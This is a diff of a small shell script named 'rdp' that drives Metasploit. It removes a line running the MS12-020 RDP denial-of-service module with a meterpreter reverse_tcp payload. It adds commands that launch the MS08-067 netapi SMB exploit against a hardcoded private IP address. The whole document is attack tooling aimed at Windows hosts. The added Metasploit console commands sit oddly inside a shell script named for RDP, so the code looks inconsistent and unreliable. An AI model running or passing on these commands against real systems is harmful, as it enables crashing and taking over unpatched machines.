@@ -6,5 +6,6 @@
 #
 # "chmod u+x rdp" may need to be run to gain file permissions.
 # Run the script using "./rdp <ip address>".
-
-msfconsole -r auxiliary/dos/windows/rdp/ms12_020_maxchannelids rhost=$1 payload=windows/meterpreter/reverse_tcp E
+use exploit/windows/smb/ms08_067_netapi 
+set RHOST 192.168.159.133
+exploit
